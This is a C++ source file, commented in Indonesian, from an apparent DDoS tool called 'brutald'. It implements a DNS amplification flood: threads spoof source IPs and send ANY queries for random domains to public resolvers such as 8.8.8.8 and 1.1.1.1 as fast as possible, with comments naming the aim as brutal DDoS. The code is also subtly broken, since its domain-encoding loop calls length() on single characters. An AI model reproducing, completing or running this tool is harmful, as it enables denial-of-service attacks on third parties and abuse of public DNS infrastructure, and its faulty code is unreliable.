#include "DnsAmplification.h"
#include "../core/PacketGenerator.h"
#include "../network/SocketManager.h"
#include "../utils/Logger.h"
#include "../utils/RandomUtils.h"

#include <iostream>
#include <sstream>
#include <random>
#include <chrono>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <cstring>

namespace brutald {

// Konstanta DNS Header Size
const size_t DNS_HEADER_SIZE = 12;

DnsAmplification::DnsAmplification(
    const DnsConfig& config,
    std::shared_ptr<brutald::network::SocketManager> socket_mgr,
    std::shared_ptr<brutald::network::PacketGenerator> packet_gen,
    std::shared_ptr<brutald::utils::Logger> logger)
    : config_(config),
      socket_mgr_(std::move(socket_mgr)),
      packet_gen_(std::move(packet_gen)),
      logger_(std::move(logger)) {}

DnsAmplification::~DnsAmplification() {
    stop();
}

void DnsAmplification::start() {
    if (running_) return;
    running_ = true;
    stats_ = {};

    for (int i = 0; i < config_.threads; ++i) {
        threads_.emplace_back(&DnsAmplification::worker_thread, this, i);
    }
    
    if (config_.verbose) {
        logger_->info("DNS Amplification started with %d threads.", config_.threads);
    }
}

void DnsAmplification::stop() {
    if (!running_) return;
    running_ = false;
    for (auto& t : threads_) {
        if (t.joinable()) {
            t.join();
        }
    }
    if (config_.verbose) {
        logger_->info("DNS Amplification stopped.");
    }
}

void DnsAmplification::worker_thread(int thread_id) {
    // Buat socket UDP unik untuk thread ini jika diperlukan, atau bagikan socket manager
    // Di sini kita asumsikan SocketManager menyediakan method untuk sendto
    
    // Random seed untuk thread ini
    unsigned int seed = std::hash<std::thread::id>{}(std::this_thread::get_id()) ^ thread_id;
    std::mt19937 rng(seed);

    // Pilih resolver secara acak dari daftar default atau user defined
    auto select_resolver = [&]() -> std::string {
        if (config_.use_random_resolvers && !default_resolvers.empty()) {
            std::uniform_int_distribution<size_t> dist(0, default_resolvers.size() - 1);
            return default_resolvers[dist(rng)];
        }
        // Fallback ke resolver statis jika tidak diaktifkan random mode
        return "8.8.8.8"; 
    };

    while (running_) {
        try {
            // Batas RPS sederhana menggunakan sleep atau busy wait tergantung kebutuhan presisi
            // Untuk DDoS brutal, kita biasanya ingin max throughput
            
            std::string resolver_ip = select_resolver();
            
            // Buat query DNS
            // Tipe query: ANY (untuk respons besar) atau TXT
            uint16_t query_type = 255; // TYPE ANY
            // Atau bisa gunakan 16 (TXT) untuk hasil yang lebih stabil di beberapa resolver
            // uint16_t query_type = 16; 

            // Generate Domain Name Random untuk menghindari cache
            std::string domain = utils::RandomUtils::generateRandomDomain(15);
            
            // Build DNS Query Packet
            // Format: ID(2) + Flags(2) + QDCount(2) + ANCount(2) + NSCount(2) + ARCount(2) + Question...
            std::vector<uint8_t> dns_payload(DNS_HEADER_SIZE + domain.length() + 4); // +4 untuk type/class terminator
            
            // Header
            uint16_t id = rng() & 0xFFFF;
            uint16_t flags = 0x0100; // Standard Query, Recursion Desired
            
            // Isi Header
            dns_payload[0] = (id >> 8) & 0xFF;
            dns_payload[1] = id & 0xFF;
            dns_payload[2] = (flags >> 8) & 0xFF;
            dns_payload[3] = flags & 0xFF;
            
            // QDCOUNT = 1
            dns_payload[4] = 0;
            dns_payload[5] = 1;
            
            // ANCOUNT, NSCOUNT, ARCOUNT = 0
            memset(dns_payload.data() + 6, 0, 6);
            
            // Question Section
            size_t offset = DNS_HEADER_SIZE;
            for (const char& c : domain) {
                dns_payload[offset++] = static_cast<uint8_t>(c.length());
                for (size_t j = 0; j < c.length(); ++j) {
                    dns_payload[offset++] = static_cast<uint8_t>(c[j]);
                }
            }
            dns_payload[offset++] = 0; // Terminator label
            
            // Type (2 bytes) and Class (2 bytes IN)
            dns_payload[offset++] = (query_type >> 8) & 0xFF;
            dns_payload[offset++] = query_type & 0xFF;
            dns_payload[offset++] = 0; // Class IN
            dns_payload[offset++] = 1;

            // Spoof Source IP
            std::string src_ip = utils::RandomUtils::generateRandomIPv4();
            std::string dst_ip = resolver_ip; // Kirim ke resolver
            
            // Kirim paket
            // Gunakan socket manager untuk mengirim raw bytes ke port 53
            socket_mgr_->sendRawUdp(src_ip, 0, dst_ip, 53, dns_payload);
            
            // Update stats
            {
                std::lock_guard<std::mutex> lock(stats_mutex_);
                stats_.packets_sent++;
                stats_.bytes_sent += dns_payload.size();
            }

            // Optional: Sleep kecil jika ada limit RPS global, tapi biasanya loop cepat lebih baik
            
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(stats_mutex_);
            stats_.errors++;
            if (config_.verbose) {
                logger_->error("Thread %d Error in DNS attack: %s", thread_id, e.what());
            }
        }
    }
}

DnsAmplification::Stats DnsAmplification::getStats() const {
    std::lock_guard<std::mutex> lock(stats_mutex_);
    return stats_;
}

const std::vector<std::string> DnsAmplification::default_resolvers = {
    "8.8.8.8",   // Google
    "8.8.4.4",   // Google Secondary
    "1.1.1.1",   // Cloudflare
    "1.0.0.1",   // Cloudflare Secondary
    "9.9.9.9",   // Quad9
    "208.67.222.222" // OpenDNS
};

} // namespace brutald
